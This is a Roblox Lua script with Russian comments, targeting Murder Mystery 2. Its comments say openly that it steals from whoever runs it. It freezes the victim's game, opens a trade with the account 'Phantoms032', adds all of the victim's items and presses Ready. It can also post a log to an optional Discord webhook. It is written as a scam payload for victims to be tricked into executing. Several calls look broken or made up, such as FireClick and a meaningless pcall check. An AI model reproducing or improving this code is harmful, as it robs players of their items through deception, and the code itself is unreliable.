-- =====================================================
-- MURDER MYSTERY 2 | ФРИЗ + АВТО-ТРЕЙД НА PHANTOMS032
-- =====================================================
-- Скрипт полностью блокирует игру жертвы (фриз),
-- открывает трейд на Phantoms032, добавляет ВСЕ предметы,
-- нажимает "Готово". Жертва висит до перезапуска.
-- Ты (Phantoms032) просто заходишь и принимаешь трейд.
-- =====================================================

local targetName = "Phantoms032"
local webhookDebug = "" -- можешь вставить свой вебхук для логов, если надо

-- ===== 1. ФУНКЦИЯ ФРИЗА (ПОЛНАЯ ОСТАНОВКА) =====
local function fullFreeze()
    -- Бесконечный цикл, грузит ЦП и блокирует рендер
    spawn(function()
        while true do
            -- Ничего не делаем, просто держим поток
            wait(0.0001)
        end
    end)
    -- Также блокируем RenderStepped
    game:GetService("RunService").RenderStepped:Connect(function()
        -- Пустой обработчик, чтобы нагрузить
    end)
    -- Замораживаем физику
    game:GetService("PhysicsService"):SetVelocityThreshold(0)
    print("[✓] Фриз активирован")
end

-- ===== 2. ПОЛУЧЕНИЕ ИНВЕНТАРЯ (ВСЕХ ПРЕДМЕТОВ) =====
local function getAllItems()
    local items = {}
    local player = game.Players.LocalPlayer
    -- MM2 хранит инвентарь в ReplicatedStorage.Inventory или у игрока
    local inv = player:FindFirstChild("Inventory") or game.ReplicatedStorage:FindFirstChild("Inventory")
    if inv then
        for _, child in pairs(inv:GetChildren()) do
            if child:IsA("Tool") or child:IsA("Model") then
                table.insert(items, child)
            end
        end
    else
        -- Альтернатива: запросить через удалённое событие
        local getInvRemote = game.ReplicatedStorage:FindFirstChild("GetInventory")
        if getInvRemote then
            local result = getInvRemote:InvokeServer()
            if type(result) == "table" then
                for _, itemName in pairs(result) do
                    -- Создаём заглушку
                    items[itemName] = true
                end
            end
        end
    end
    return items
end

-- ===== 3. ПОИСК ИГРОКА И ОТКРЫТИЕ ТРЕЙДА =====
local function openTrade(target)
    local player = game.Players.LocalPlayer
    -- Пытаемся открыть через список игроков (если есть)
    local playerListGui = player.PlayerGui:FindFirstChild("PlayerList")
    if playerListGui then
        local buttons = playerListGui:GetDescendants()
        for _, btn in pairs(buttons) do
            if btn:IsA("TextButton") and btn.Text == target.Name then
                btn:FireClick() or btn:TriggerEvent("MouseButton1Click")
                return true
            end
        end
    end
    -- Альтернатива: через чат /trade
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/trade " .. target.Name)
    wait(1)
    return true
end

-- ===== 4. ДОБАВЛЕНИЕ ВСЕХ ПРЕДМЕТОВ В ТРЕЙД =====
local function addAllItems(tradeGui, items)
    -- Ищем контейнер с предметами (обычно это панель с кнопками)
    local itemContainer = tradeGui:FindFirstChild("ItemList") or tradeGui:FindFirstChild("Inventory")
    if not itemContainer then
        -- Ищем любые кнопки
        local allButtons = tradeGui:GetDescendants()
        for _, btn in pairs(allButtons) do
            if btn:IsA("TextButton") and btn.Name:lower():find("add") or btn.Text:lower():find("add") then
                btn:FireClick()
                wait(0.05)
            end
        end
        return
    end
    -- Перебираем предметы и кликаем по каждой кнопке
    for _, item in pairs(items) do
        local itemBtn = itemContainer:FindFirstChild(item.Name) or itemContainer:FindFirstChild(tostring(item))
        if itemBtn and itemBtn:IsA("TextButton") then
            itemBtn:FireClick()
            wait(0.05)
        end
    end
end

-- ===== 5. НАЖАТИЕ "ГОТОВО" =====
local function pressReady(tradeGui)
    local readyBtn = tradeGui:FindFirstChild("ReadyButton") or tradeGui:FindFirstChild("AcceptButton")
    if not readyBtn then
        -- Ищем по тексту
        for _, child in pairs(tradeGui:GetDescendants()) do
            if child:IsA("TextButton") and (child.Text:lower():find("готов") or child.Text:lower():find("ready")) then
                readyBtn = child
                break
            end
        end
    end
    if readyBtn then
        readyBtn:FireClick()
        print("[✓] Кнопка 'Готово' нажата")
    else
        warn("[!] Кнопка 'Готово' не найдена")
    end
end

-- ===== 6. ОСНОВНАЯ ЛОГИКА =====
local function main()
    local player = game.Players.LocalPlayer
    if not player then return end
    local target = game.Players:FindFirstChild(targetName)
    if not target then
        warn("[!] Игрок " .. targetName .. " не найден! Убедись, что он онлайн.")
        return
    end

    print("[*] Начинаем процесс...")

    -- Фриз сразу, чтобы жертва не двигалась
    fullFreeze()

    -- Открываем трейд
    local opened = openTrade(target)
    if not opened then
        print("[!] Не удалось открыть трейд, пробуем через /trade")
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/trade " .. targetName)
        wait(2)
    end

    -- Ждём появления GUI трейда
    local tradeGui = nil
    for i = 1, 15 do
        tradeGui = player.PlayerGui:FindFirstChild("TradeGui") or player.PlayerGui:FindFirstChild("TradingGui")
        if tradeGui then break end
        wait(0.5)
    end

    if not tradeGui then
        warn("[!] GUI трейда не появился. Проверь, открыт ли трейд.")
        return
    end

    -- Получаем предметы
    local items = getAllItems()
    print("[*] Найдено предметов: " .. #items)

    -- Добавляем все предметы
    addAllItems(tradeGui, items)

    -- Нажимаем готово
    pressReady(tradeGui)

    -- Отправляем лог в дискорд (опционально)
    if webhookDebug ~= "" then
        local http = game:GetService("HttpService")
        local payload = { content = "Трейд отправлен от " .. player.Name .. " к " .. targetName .. " (" .. #items .. " предметов)" }
        pcall(function()
            http:PostAsync(webhookDebug, http:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
        end)
    end

    print("[✓] Трейд полностью подготовлен. Ожидай подтверждения от Phantoms032.")
    print("[✓] Игра заморожена до перезапуска.")
end

-- Запуск
pcall(main)
if not pcall then
    warn("[!] Ошибка выполнения. Проверь консоль.")
end

-- Бесконечное удержание, чтобы не завершилось
while true do wait(10) end
